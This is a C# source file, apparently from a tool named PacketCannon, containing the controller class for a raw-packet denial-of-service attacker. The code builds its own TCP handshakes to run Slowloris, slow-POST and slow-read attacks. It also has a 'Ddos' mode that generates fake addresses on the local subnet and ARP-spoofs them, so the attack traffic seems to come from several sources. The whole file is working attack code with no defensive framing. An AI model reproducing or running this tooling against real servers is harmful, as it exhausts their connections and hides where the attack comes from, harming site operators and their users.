using PcapDotNet.Core;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using static PacketCannon.AttackVariation;
using static PacketCannon.SenderStatus;

namespace PacketCannon
{
    public class DosController
    {
        public ConcurrentBag<DosSender> DosSenders;

        public string SourceIpv4;
        public string DestinationIpV4 { get; set; }
        public static PacketCommunicator Communicator;
        public PacketDevice SelectedDevice { get; set; }
        private Attacks? _attackMode = Attacks.SlowLoris;
        public int SenderSize;
        public bool Terminate = false;
        public string HostAddress;
        public int SenderTimeOut;
        public int SenderWaveTimeOut;
        public int SourcePort;
        public int PortStep;
        public MacAddress SourceMac { get; set; }
        public MacAddress DestinationMac { get; set; }
        public int SlowPostContentLength;
        public string SlowLorisKeepAliveData;
        public string SlowLorisHeader;
        public string SlowPostHeader;
        public string SlowReadUrl;
        public int SlowReadWindowSize;
        public static List<IpV4Address> FakeIpV4Addresses;
        public bool Ddos = false;
        public int DdosCount = 5;
        public int FakeIpAddressMin = 1;
        public int FakeIpAddressMax = 254;
        private Random rand = new Random();

        public string GetLocalMacAddress(string ipAddress)
        {
            return Regex.Replace(
                NetworkInterface.GetAllNetworkInterfaces()
                    .FirstOrDefault(netInt => SelectedDevice.Name.Contains(netInt.Id))
                    ?.GetPhysicalAddress().ToString() ?? throw new InvalidOperationException(),
                ".{2}", "$0:").TrimEnd(':');
        }

        public void ChangeAttackMode(string attacksText)
        {
            switch (attacksText)
            {
                case "0":
                    _attackMode = Attacks.SlowLoris;
                    break;

                case "1":
                    _attackMode = Attacks.SlowPost;
                    break;

                case "2":
                    _attackMode = Attacks.SlowRead;
                    break;
            }
        }

        public void StartSenders()
        {
            DestinationMac = GetMacFromIp(DestinationIpV4);

            SourceMac = new MacAddress(Regex.Replace(
                NetworkInterface.GetAllNetworkInterfaces()
                    .FirstOrDefault(netInt => SelectedDevice.Name.Contains(netInt.Id))
                    ?.GetPhysicalAddress().ToString() ?? throw new InvalidOperationException(),
                ".{2}", "$0:").TrimEnd(':'));

            if (Ddos)
            {
                var tester = new DosSender(SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress,
                    SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader,
                    SlowReadUrl, SourcePort, PortStep);
                ArpSpoofAddress(DdosCount, tester);
            }

            DosSenders = new ConcurrentBag<DosSender>();

            for (int i = 0; i < SenderSize; i++)
            {
                DosSenders.Add(new DosSender(SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
            }

            foreach (var dosSender in DosSenders)
            {
                Console.WriteLine(dosSender.SourceIpV4.ToString());
            }

            if (_attackMode == Attacks.SlowRead)
            {
                foreach (var dosSender in DosSenders)
                {
                    dosSender.WindowSize = (ushort)SlowReadWindowSize;
                }
            }
            //Random rand = new Random();
            //var path = $@"C:\Users\Mystify_PC\source\repos\WpfApp2\test{rand.Next()}.txt";
            //var a = File.Create(path);
            //a.Close();
            var watcher = new Thread(SearchForPackets);
            watcher.Start();
            using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
            {
                while (true)
                {
                    //var logs = "";
                    foreach (var dosSender in DosSenders)
                    {
                        switch (dosSender.Status)
                        {
                            case SenderStat.SendSyn:
                                dosSender.SendSyn(Communicator);
                                dosSender.Status = SenderStat.WaitingForAck;
                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)}-- SendingSyn";
                                break;

                            case SenderStat.RecievingSlowRead:
                                if (dosSender.Waited > 7)
                                {
                                    dosSender.Status = SenderStat.SendSyn;
                                    dosSender.SeqNumber = (uint)new Random().Next();
                                }

                                dosSender.Waited++;
                                break;

                            case SenderStat.WaitingForAck:
                                if (dosSender.Waited > 4)
                                {
                                    dosSender.Status = SenderStat.SendSyn;
                                    dosSender.SeqNumber = (uint)new Random().Next();
                                }
                                dosSender.Waited++;
                                break;

                            //SLOWLORIS
                            case SenderStat.SendingAck when _attackMode == Attacks.SlowLoris:
                                dosSender.SendAck(Communicator);
                                dosSender.Status = SenderStat.SendingSlowLorisGetHeader;
                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SendingLorisHeader";
                                break;

                            //SLOW-POST
                            case SenderStat.SendingAck when _attackMode == Attacks.SlowPost:
                                dosSender.SendAck(Communicator);
                                dosSender.Status = SenderStat.SedingSlowPostHeader;
                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";

                                break;

                            //SLOW-READ
                            case SenderStat.SendingAck when _attackMode == Attacks.SlowRead:
                                dosSender.SendAck(Communicator);
                                dosSender.Status = SenderStat.SedingGetForSlowRead;

                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
                                break;

                            //SLOWLORIS
                            case SenderStat.SendingSlowLorisGetHeader:
                                dosSender.SendGetNotComplete(Communicator);
                                dosSender.Status = SenderStat.SendingKeepAliveForSlowLoris;

                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisGetHeader";
                                break;

                            //SLOWLORIS
                            case SenderStat.SendingKeepAliveForSlowLoris:
                                dosSender.SendSlowLorisKeepAlive(Communicator);

                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisKeepAlive";
                                break;

                            //SLOW-POST
                            case SenderStat.SedingSlowPostHeader:
                                dosSender.SendSlowPostHeader(Communicator);
                                dosSender.Status = SenderStat.SedingKeepAliveForSlowPost;

                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";
                                break;

                            //SLOW-POST
                            case SenderStat.SedingKeepAliveForSlowPost:
                                dosSender.SendSlowPostKeepAlive(Communicator);

                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostKeepAlive";
                                break;

                            //SLOW-READ
                            case SenderStat.SedingGetForSlowRead:
                                dosSender.WindowSize = (ushort)SlowReadWindowSize;
                                dosSender.SendSlowReadCompleteGet(Communicator);
                                dosSender.Status = SenderStat.RecievingSlowRead;
                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
                                break;

                            //SLOW-READ
                            case SenderStat.SendKeepAliveAckForSlowRead:
                                dosSender.Status = SenderStat.RecievingSlowRead;
                                dosSender.SendAck(Communicator);

                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadKeepAlive";
                                break;

                            default:
                                throw new ArgumentOutOfRangeException();
                        }
                        Thread.Sleep(SenderTimeOut == 0 ? new Random().Next(5, 20) : SenderTimeOut);
                    }
                    Thread.Sleep(SenderWaveTimeOut == 0 ? new Random().Next(1000, 5000) : SenderWaveTimeOut);
                    //using (StreamWriter sw = File.AppendText(path))
                    //{
                    //    sw.Write(logs);
                    //}
                }
            }
        }

        private void SearchForPackets()
        {
            using (PacketCommunicator com = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
            {
                com.SetFilter("tcp and src " + DestinationIpV4 + " and src port " + DosSender.DestinationPort);
                while (true)
                {
                    if (com.ReceivePacket(out var packet) == PacketCommunicatorReceiveResult.Ok)
                    {
                        DosSender a;
                        try
                        {
                            a = Ddos ? DosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
                             : DosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort);
                        }
                        catch (Exception)
                        {
                            continue;
                        }

                        if (a.Status == SenderStat.WaitingForAck)
                        {
                            a.Status = SenderStat.SendingAck;
                            a.SeqNumber = a.ExpectedAckNumber;
                            a.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + 1;
                            a.Waited = 0;
                        }
                        else if (packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)20 || packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)4)
                        {
                            a.Status = SenderStat.SendSyn;
                            a.SeqNumber = (uint)new Random().Next();
                        }
                        else if (a.Status == SenderStat.RecievingSlowRead && _attackMode == Attacks.SlowRead &&
                                 (packet.Ethernet.IpV4.Tcp.ControlBits == TcpControlBits.Acknowledgment || packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)24))
                        {
                            a.Status = SenderStat.SendKeepAliveAckForSlowRead;
                            a.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
                            a.Waited = 0;
                        }
                    }
                }
            }
        }

        private void ArpSpoofAddress(int count, DosSender tester)
        {
            CreateFakeAddresses(count);

            using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
            {
                Communicator.SetFilter("arp and src " + DestinationIpV4);
                foreach (var fakeIpV4Address in FakeIpV4Addresses)
                {
                    for (int i = 0; i < 5; i++)
                    {
                        tester.PingAddress(Communicator, fakeIpV4Address);

                        if (Communicator.ReceivePacket(out var packet) == PacketCommunicatorReceiveResult.Ok && packet.Ethernet.Source == tester.DestinationMac)
                        {
                            break;
                        }
                        Thread.Sleep(100);
                    }
                    tester.SendArpResponse(Communicator, fakeIpV4Address);
                }
            }
        }

        private void CreateFakeAddresses(int count)
        {
            FakeIpV4Addresses = new List<IpV4Address>();
            var ipAddress = ParseIpAddress(SourceIpv4);

            while (FakeIpV4Addresses.Count != count)
            {
                var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{rand.Next(FakeIpAddressMin, FakeIpAddressMax)}");
                if (!FakeIpV4Addresses.Contains(ipAddressFaked) && !ipAddressFaked.ToString().Equals(SourceIpv4) && !ipAddressFaked.ToString().Equals(DestinationIpV4))
                {
                    FakeIpV4Addresses.Add(ipAddressFaked);
                }
            }
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, [Out] byte[] pMacAddr, ref int phyAddrLen);

        public static MacAddress GetMacFromIp(string ipAdress)
        {
            var hostIpAddress = IPAddress.Parse(ipAdress);
            var ab = new byte[6];
            int len = ab.Length, r = DosController.SendARP((int)hostIpAddress.Address, srcIp: 0, pMacAddr: ab, phyAddrLen: ref len);
            return new MacAddress(BitConverter.ToString(ab, 0, 6).Replace("-", ":"));
        }

        private static string[] ParseIpAddress(string ipV4Address)
        {
            return ipV4Address.Split('.').Select(n => n).ToArray();
        }

        public static bool PingAddress(string address)
        {
            bool pingable = false;
            Ping pinger = null;

            try
            {
                pinger = new Ping();
                PingReply reply = pinger.Send(address);
                pingable = reply.Status == IPStatus.Success;
            }
            catch (PingException)
            {
                // Discard PingExceptions and return false;
            }
            finally
            {
                pinger?.Dispose();
            }

            return pingable;
        }

        public static IPAddress GetDefaultGateway()
        {
            return NetworkInterface
                .GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .FirstOrDefault(a => a != null);
        }
    }
}